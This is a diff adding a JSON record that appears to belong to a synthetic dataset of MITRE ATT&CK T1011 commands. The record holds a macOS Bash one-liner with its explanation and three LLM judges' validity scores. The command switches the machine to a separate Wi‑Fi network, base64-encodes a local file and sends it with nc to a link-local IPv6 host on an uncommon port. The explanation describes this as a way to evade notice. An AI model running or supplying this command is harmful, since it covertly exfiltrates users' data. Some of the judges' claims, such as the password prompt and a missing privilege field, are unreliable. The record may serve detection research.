@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
+  "explanation": "Moves a JSON metrics file across an alternative Wi‑Fi SSID using IPv6 link-local addressing and a high, uncommon TCP port. Base64 encoding reduces casual visibility and the use of a separate medium satisfies T1011.",
+  "rationale_steps": [
+    "Clear any current Wi‑Fi association.",
+    "Join a relay SSID distinct from the primary network.",
+    "Base64-encode the file inline.",
+    "Send via IPv6 link-local constrained to the Wi‑Fi interface on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-c2421240",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and operators with valid flags for airport, networksetup, openssl, and nc, including correctly formatted IPv6 link-local address with zone index.",
+        "semantic_score": 3,
+        "semantic_justification": "The sequence would exfiltrate the file via a different Wi‑Fi SSID using base64 over IPv6 as described, but networksetup typically requires elevated privileges and only airport is run with sudo, conflicting with the stated 'Privilege: None' and reducing likelihood of success.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T04:53:01.992489Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, openssl, nc), and correct piping syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by disconnecting from current WiFi, connecting to a specific network, encoding data with base64, and transmitting it over IPv6 to a specific endpoint using netcat with a timeout - all core elements of T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:53:08.468060Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command is parseable, but the `openssl enc -base64` portion is syntactically incomplete for non-interactive use (missing cipher/password parameters) and will halt execution by prompting for input, making it broken for its intended scriptable purpose.",
+        "semantic_score": 1,
+        "semantic_justification": "The core automated data transfer is semantically broken by `openssl enc` prompting for a password, contradicting the 'automated' aspect of T1011, and the stated 'Privilege: None' contradicts the use of `sudo` for `airport` and `networksetup` commands.",
+        "combined_score": 1.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:53:32.978561Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
